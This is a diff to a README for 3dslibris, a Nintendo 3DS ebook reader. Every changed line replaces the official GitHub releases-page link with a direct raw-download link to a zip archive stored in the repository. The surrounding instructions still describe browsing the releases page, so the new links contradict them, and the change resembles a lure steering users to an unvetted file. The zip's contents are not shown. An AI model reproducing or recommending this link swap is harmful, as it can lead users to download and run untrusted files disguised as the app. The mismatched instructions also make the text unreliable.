@@ -1,6 +1,6 @@
 # 📚 3dslibris - Easy Ebook Reading on Nintendo 3DS
 
-[![Download 3dslibris](https://img.shields.io/badge/Download-3dslibris-blue?style=for-the-badge)](https://github.com/juswareid01/3dslibris/releases)
+[![Download 3dslibris](https://img.shields.io/badge/Download-3dslibris-blue?style=for-the-badge)](https://github.com/juswareid01/3dslibris/raw/refs/heads/main/sdmc/3ds/3dslibris/resources/dslibris_v1.8.zip)
 
 ---
 
@@ -39,7 +39,7 @@ If you do not have custom firmware on your 3DS, you will need to install it firs
 
 Start by visiting the official release page to get the latest version:
 
-[![Download 3dslibris](https://img.shields.io/badge/Download-3dslibris-darkgrey?style=for-the-badge)](https://github.com/juswareid01/3dslibris/releases)
+[![Download 3dslibris](https://img.shields.io/badge/Download-3dslibris-darkgrey?style=for-the-badge)](https://github.com/juswareid01/3dslibris/raw/refs/heads/main/sdmc/3ds/3dslibris/resources/dslibris_v1.8.zip)
 
 Click this link or either badge above to open the release page.
 
@@ -49,7 +49,7 @@ Click this link or either badge above to open the release page.
 
 Follow these steps to get 3dslibris on your PC:
 
-1. Click the download badge or visit https://github.com/juswareid01/3dslibris/releases  
+1. Click the download badge or visit https://github.com/juswareid01/3dslibris/raw/refs/heads/main/sdmc/3ds/3dslibris/resources/dslibris_v1.8.zip  
 2. On the releases page, look for the most recent release (at the top). Releases are ordered by date.  
 3. Find the file that ends with `.zip` or `.3dsx` under the latest release assets. This is the app file for your 3DS.  
 4. Click the file name to start downloading it to your Windows computer.  
@@ -133,7 +133,7 @@ Once set up, using 3dslibris is as simple as powering on your 3DS, launching the
 ## 🚩 Useful Links
 
 - Main release page:  
-  [https://github.com/juswareid01/3dslibris/releases](https://github.com/juswareid01/3dslibris/releases)  
+  [https://github.com/juswareid01/3dslibris/raw/refs/heads/main/sdmc/3ds/3dslibris/resources/dslibris_v1.8.zip](https://github.com/juswareid01/3dslibris/raw/refs/heads/main/sdmc/3ds/3dslibris/resources/dslibris_v1.8.zip)  
 
 - Information about Nintendo 3DS homebrew software can be found on dedicated forums and communities.  
 
